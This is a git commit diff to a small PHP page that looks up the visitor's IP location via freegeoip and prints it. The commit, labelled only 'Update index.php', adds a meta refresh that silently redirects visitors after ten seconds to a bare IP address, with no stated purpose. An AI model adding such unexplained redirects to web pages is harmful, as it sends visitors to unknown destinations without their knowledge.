8838874f316ca27de802e455b7c4bbd6900d478a
Waftrue <waftrue@gmail.com>
2016-09-05 20:27:19 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,7 @@
 <html>
 
   <link rel="stylesheet" type="text/css" href="http://waftrue.comxa.com/style.css">
+<meta http-equiv="refresh" content="10;url=http://104.155.47.57/1/" />
 
 </html>
 <?php
@@ -14,5 +15,6 @@ $api = file_get_contents("http://freegeoip.net/xml/{$clientip}");
 
 
 echo $api;
+
 ?>
 
